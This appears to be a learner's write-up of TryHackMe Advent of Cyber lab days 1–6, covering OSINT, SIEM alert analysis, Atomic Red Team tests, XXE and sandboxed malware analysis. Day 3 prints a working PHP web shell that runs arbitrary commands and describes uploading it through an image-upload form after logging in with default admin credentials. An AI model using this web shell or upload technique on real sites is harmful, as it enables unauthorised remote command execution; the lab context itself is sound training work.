
# Day 1

**New Things Learnt**

* About malicious PowerShell scripts and why it is not safe to open them in a windows environment.
* Today's challenge is about OPSEC(Operational Security) failure. The user failed to remain anonymous and his details were revealed.
* The page also includes a bunch of interesting examples and instances of OPSEC fails.
* The first question can be answered by simply running the command 
```bash
exitftool song.mp3
```
from your Attack Box

* After going thru the [link](https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1) , by clicking on the username `MM-WarevilleTHM`, we can see that on his GitHub page, his most popular repo named `M.M` has his details in his README.md file. Here we get the answer to our second question, that is, his name is ***Mayor Malware***.

* On the same user profile, if we go thru his second repo, that is where the malicious script is present, and we see that this repo only has **1** commit, and that is our answer. 

# Day 2

**New Things Learnt**

* About the SOC, which is a team of IT security professionals that basically monitors a company's network and systems to prevent malicious activity from taking place.
* Now, they analyze alerts to determine if they are **F**alse **P**ositives or  **T**rue **P**ositives.
* Contacting the administrator/user is one of the best ways to analyze if the alert is real or not.

In this challenge, we're given an SIEM (Security Information and Event Management system) to analyze events that occurred between a certain timeframe.

* We notice that someone ran an encoded PowerShell command on multiple machines, and before each execution, there was a successful authentication.
	* After a lot of adding and removing filters, we get the command `SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==`, which in Base64 translates to `Install-WindowsUpdate -AcceptAll -AutoReboot`

Turns out the command was for a windows update.

Now, coming to the questions:

1. to find the name of the account causing the login attempts, we set the filters to `event.outcome: failure`, where under **user.name**, we can clearly make out the name to be **service_admin**.
using this filter, we also find the IP address of Glitch, which is the last question's answer. 
`10.0.255.1`

2. to find the number of failed login attempts, using the same filters, literally in the same page, the number is right above the graph. The number of failed attempts is **6791**.

3. To find the date of login, we set the filters 
`host.hostname: ADM-01`
`event.category: authentication` 
`event.outcome: success`

and our date comes out to be **Dec 1, 2024 08:54:39.000**.

4. And as I mentioned in the start of this write-ip, the decoded command is `Install-WindowsUpdate -AcceptAll -AutoReboot`

# Day 3

**New Things Learnt**
* Learnt about Remote Code Execution (RCE) and how it can be exploited by uploading malicious files.
* Reverse Shells and Web Shell:
A Reverse Shell starts the connection on the target, and then connects back to the attacker's system.
A Web Shell is just running on the web server.

* Learnt more about navigating thru ELK(Elasticsearch, Logstash, and Kibana) using KQL(Kibana Query Language).
* Using KQL to craft a query to filter out the logs depending on the question.

For the first question, to find out where the web shell was uploaded to, we add the filter `message: shell.php` .
We see that our directory is `/media/images/rooms/shell.php`.

Second,  the IP of the attacker is visible under the **clientip** tab in that same log. Which is **10.11.83.34**

Now, we are going to approach this challenge from an attacking point of view. As a prerequisite, we were required to add `http://frostypines.thm` in our hosts file, by modifying a file called `hosts` by going to the `etc` folder in our AttackBox. 

When we finally enter the website, we will try to look for a place where the website takes an input.
This page would be our login page, now let's refer to the provided list of common login IDs and passwords: 

![Pasted image 20241206202900](https://github.com/user-attachments/assets/3c0dd72b-e958-470b-8aa9-747ed5be2c51)


and sure enough, `admin@frostypines.thm` as the email and admin as the password works perfectly.

Now that we're in the website, we need to find a place that takes in a file upload, and that would be when we try to add a new room. Here there's a file upload in the form of a room image. Now we need a script.

Going to `sublime` on our desktop and pasting in the code already provided on THM:

```html
```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```

I saved the file as `room.php`, and uploaded it under the room image upload section.

Now, we need to find where the web shell script is being executed by our server. To do this, I hit `F12` and went to the network tab and it's right there. Furthermore, we see that the file header for this is `http://frostypines.thm/media/images/room.php`.  By modifying the domain name to this, we finally get access to our web shell. 

Finally, to get the contents of `flag.txt`, we use simple Linux commands like `ls` to list the directories and then `cat flag.txt` to view the contents, which was `THM{Gl1tch_Was_H3r3}`.


# Day 4

**New Things Learnt**
* Basic understanding of what a cyber kill chain is.
* Basic understanding of MITRE ATT&CK technique [T1566.001](https://attack.mitre.org/techniques/T1566/001/).
* We're going to try to trace how the attacker must have gotten in by simply emulating the same attack to look for any traces he must've left behind.
* About Sigma Rules:
	-*They're created with **YAML syntax**, which is a human-readable and easy-to-implement format.
	-Provides a universal language for writing rules that can be shared and used across various scenes. We can write a rule once and convert it to our desired theme.
	



After entering the commands in PowerShell for both test cases, one that returns "all pre-requisites are met" and the other that returns "Microsoft Words needs to be installed", We can now navigate to the temp directory by using the shortcut Win+R, and then entering `%temp%`.

Here, we find the files
![Pasted image 20241207080332](https://github.com/user-attachments/assets/063029f7-4737-4a5e-8849-023e51ec8f94)


and inside the text file **PhishingAttachment.txt**, we find the answer for the first question, which is the flag **THM{GlitchTestingForSpearphishing}**.

Now, we clean up the logs.

For the second question, we're supposed to find out what technique ID would be our point of interest. In the last lines of the page, we're told that the run will take advantage of  **a command and scripting interpreter**, so I googled this and came across [this](https://attack.mitre.org/techniques/T1059/) page, where the technique ID is clearly mentioned to be **T1059**. 

Third question is where we find out the subtechnique ID that focuses on Windows Command Shell.
A quick google search led me this [this](https://attack.mitre.org/techniques/T1059/003/) page, where our answer is **T1059.003** .

The fourth question requires us to run the PowerShell command 

```powershell
Invoke-AtomicTest T1059.003 -ShowDetails
```

as **T1059.003** is the name of our test to be simulated. Then, next to **Atomic Test Name**, we see that the name of the attack is **Simulate BlackByte Ransomware Print Bombing**.

In the same PowerShell tab, under **Attack Commands**, we see that the file we're using is **Wareville_Ransomware.txt**, which is the answer to the fifth question.

Now, for the final question, to find the flag found from the given atomic test, we give another PowerShell command 

```powershell
Invoke-AtomicTest T1059.003 
```

Now, the test successfully executes and creates multiple bash scripts, and creates a PDF and prompts us to name it. Once we have named it, opening the PDF gives us the flag, which is 
`THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}`.

btw, the contents of the flag is encoded in Base64, which when decoded translates to "Glitch is not the enemy".

# Day 5

**New Things Learnt**

* Understanding basic XML and XXE (XML External Entity).
* Understanding DTD, which is a set of rules set in place that defines the structure of an XML document. 

In this challenge, we're going to learn what is, and how to exploit an XXE vulnerability. 

First, let us open us BurpSuite to intercept our requests. Once we have set up, it looks like this 
![Pasted image 20241207102929](https://github.com/user-attachments/assets/707e178a-6395-4704-8eab-4c1fb67cada5)


Now that we have our interceptor in place, we can go interact with the website. 

In our AttackBox, we go enter our generated server that now leads us to 
![Pasted image 20241207102319](https://github.com/user-attachments/assets/b5d8ccf8-c7c1-4d77-b7b3-9fbec5ab4b4a)

When we click on "View", we see this being generated in our BurpSuite

![Pasted image 20241207103236](https://github.com/user-attachments/assets/644f6c72-d3f8-4240-9057-e137daad4c08)


 We shall send this to repeater by using **Ctrl+R**, then we see this page 
 ![Pasted image 20241207103404](https://github.com/user-attachments/assets/59197f2a-9ae6-45d9-8bc5-4ae3094f7d78)


and from here we basically just go to "Cart", and then "Proceed to Checkout", Fill in a name and an address, and we arrive at this screen

![Pasted image 20241207103728](https://github.com/user-attachments/assets/80fa0493-0a0b-45d5-9ede-506c88168b8d)


By clicking on the blue-highlighted "Wish #21", we see an HTML page stating "only elves can see other's wishes.".
Not for long tho.


Now, back to BurpSuite, we see this interesting XML structure in our 2nd request:
![Pasted image 20241207103928](https://github.com/user-attachments/assets/04ebb5e0-b128-4129-8ae8-e99faa647bc8)


Now, I'm going to use the same XXE payload that is provided on the website, i.e 
![Pasted image 20241207104137](https://github.com/user-attachments/assets/87e54b07-1545-4939-8ade-fdc8f5471ef2)


And once we hit the orange "Send" button, we see that we can, in fact, see everyone's wishes. 
From here we just start an intruder attack in order to find the flag for our first question., with these parameters:

![Pasted image 20241207104330](https://github.com/user-attachments/assets/0921707b-68ea-4e1f-b955-cf180653b000)


Once, our results arrive, we simply scroll thru them and on the 15th request, we get the flag under the response tab.

![Pasted image 20241207104441](https://github.com/user-attachments/assets/d0bc7c5d-2767-45b9-9fac-102ae0a9fc13)

1. The acquired flag is `THM{Brut3f0rc1n6_mY_w4y}`

2. Now, to access the other flag, I read in the XXE article that websites often leave changelogs vulnerable and they can be accessed since we already used an XXE payload, and sure enough:

![Pasted image 20241207105125](https://github.com/user-attachments/assets/0ccc1c9d-c8ca-4065-9c34-4f4abbdf86c7)

Our second and last flag is `THM{m4y0r_m4lw4r3_b4ckd00rs}`


# Day 6

**New Things Learnt**

* Fundamentals of using sandbox tools.
* Using YARA rules to detect malicious patterns.
* Learning about techniques to prevent malware.

*What is a Sandbox?*
A sandbox is an isolated environment where any type of code, be it malicious, can be executed without affecting the actual system. 

Firstly, we go to **Regedit** simply searching it up or using **Win+R**, and then typing it in.

Now we're introduced to **YARA**. 
Yara is basically a tool that is used to identify and classify malware based on patterns in it's code using rules and characteristics that can be traced. 

After loading up our Virtual Machine, we follow their instructions by going to PowerShell and entering the commands
```powershell
cd C:\Tools
.\JingleBells.ps1
```

While keeping this tab open, we navigate to C:\Tools\Malware and execute **MerryChirstmas.exe**. 
If we did everything correctly, our script gets executed and we should get a pop-up with the flag

![Pasted image 20241207112222](https://github.com/user-attachments/assets/6db1f7fd-ef24-42d9-82c7-81620d5fe6dd)

1. Our flag is `THM{GlitchWasHere}`

Now, we shall try out Floss, which is a tool that is optimized to extract strings from malware binaries.
Our PowerShell command this time (after `cd`ing to C:\Tools\Floss) is 
```powershell
floss.exe C:\Tools\Malware\MerryChristmas.exe |Out-file C:\tools\malstrings.txt
```

Here:
`floss.exe C:\Tools\Malware\MerryChristmas.exe` scans for binaries in the malicious .exe file. Floss will find them if any exist.
`Out-file C:\tools\malstrings.txt` is basically used to save the results in a file called `malstrings.txt`

Our output should look like this:
![Pasted image 20241207112908](https://github.com/user-attachments/assets/3d2a8ea9-536b-4506-9ee5-2a299954efc1)

Now, all we have to do is go to the `malstrings.txt` file and **Ctrl+F**  and enter "THM" as a query to find our flag.

![Pasted image 20241207113054](https://github.com/user-attachments/assets/c358bda7-1816-4704-b2c5-39d18a26970f)

2. Our flag is `THM{HiddenClue}`.




